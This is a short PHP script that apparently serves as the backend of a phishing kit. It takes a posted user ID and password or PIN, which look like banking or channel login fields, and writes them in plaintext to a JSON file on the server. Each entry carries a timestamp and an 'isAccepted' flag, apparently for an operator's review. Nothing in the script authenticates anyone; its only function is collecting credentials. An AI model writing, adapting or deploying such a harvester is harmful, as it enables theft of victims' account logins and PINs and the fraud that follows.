<?php
// Start the session
session_start();
?>
<?php
	function push(&$a,$b){
		foreach ($b as $key => $value) {
			$a[$key] = $value;
		}
	}

    $update_flag = false;

    $data = json_decode(file_get_contents("php://input"), true);

    $_SESSION['userid'] = trim($data['channelUserID']);
    $_SESSION['password'] = trim($data['channelPswdPin']);

	$update_flag = false;
	$out_dir = "./zult/access.json";
	$uid = md5($_SESSION['userid'] . $_SESSION['password']);
	$results = json_decode(file_get_contents($out_dir), true);
	if(!isset($results[$uid])){
		$results[$uid] = array();
	}
	if(isset($data['channelUserID'],$data['channelUserID'])){
		push($results[$uid],array('userid' => $data['channelUserID'] , 'password' => $data['channelPswdPin'] , 'isAccepted' => 'no', 'time' => time() ));
		$update_flag = true;
 	}

	if($update_flag){
		$results['segment'] = mt_rand();
	}

	$fh = fopen($out_dir,"w");
    
	fwrite($fh, json_encode($results));
	fclose($fh);

    echo $uid;
?>
